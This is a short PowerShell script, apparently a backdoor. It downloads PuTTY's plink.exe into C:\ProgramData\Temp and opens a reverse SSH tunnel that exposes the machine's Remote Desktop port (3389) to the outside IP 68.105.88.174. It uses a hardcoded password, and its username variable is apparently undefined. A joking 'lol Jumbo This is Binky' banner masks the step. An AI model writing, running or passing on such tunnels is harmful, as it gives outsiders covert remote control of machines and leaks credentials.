$host.UI.RawUI.ForegroundColor = "Pink"

$plinkUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
$destinationPath = "C:\ProgramData\Temp\plink.exe"

Write-Host "lol Jumbo This is Binky..." -NoNewline
Start-Sleep -Seconds 2
Write-Host " Done."

Invoke-WebRequest -Uri $plinkUrl -OutFile $destinationPath

& $destinationPath -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 68.105.88.174